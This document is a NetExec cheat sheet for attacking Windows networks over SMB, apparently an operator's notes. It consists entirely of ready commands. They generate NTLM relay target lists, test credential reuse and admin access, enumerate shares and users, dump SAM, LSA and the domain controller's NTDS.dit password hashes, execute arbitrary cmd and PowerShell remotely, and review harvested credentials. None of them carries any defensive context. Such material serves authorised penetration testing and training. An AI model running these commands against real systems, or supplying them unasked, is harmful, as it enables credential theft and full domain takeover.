# NetExec

Similar Syntax to CME

### Find ip/hostname/SMB Signinig/etc:

```bash
netexec smb targets.txt
```

### Generate a list of SMB Signing disabled for relays

```bash
netexec smb targets.txt --gen-relay-list relay.txt
```

### Find hosts user can log into/is admin on

```bash
netexec smb targets.txt -u user -p 'password'
```

### Enumerate shares

```bash
netexec smb ip -u user -p 'password' --shares
```

### Dump SAM

```bash
netexec smb ip -u user -p 'password' --sam
```

### Dump LSA

```bash
netexec smb ip -u user -p 'password' --lsa
```

### Pass cmd

```bash
netexec smb ip -u user -p 'password' -x 'command'
```

### Pass powershell

```bash
netexec smb ip -u user -p 'password' -X 'command'
```

### List users if Guest account is enabled

```bash
netexec smb (ip) -u 'Guest' -p '' --rid-brute
```

### Look at domain admins

```bash
netexec smb ip -u user -p 'password' -x 'net group "Domain Admins" /domain'
```

### Look at logged on users

```bash
netexec smb ip -u user -p 'password' --loggedon-users
```

### Look at NTDS.dit - is LOUD - USE WITH CAUTION

```bash
netexec smb dc-ip -u domain-admin-user -p 'password' --ntds
```

## Database

### View database

```bash
nxcdb
```

### View creds grabbed via SMB

```bash
proto smb
creds
```
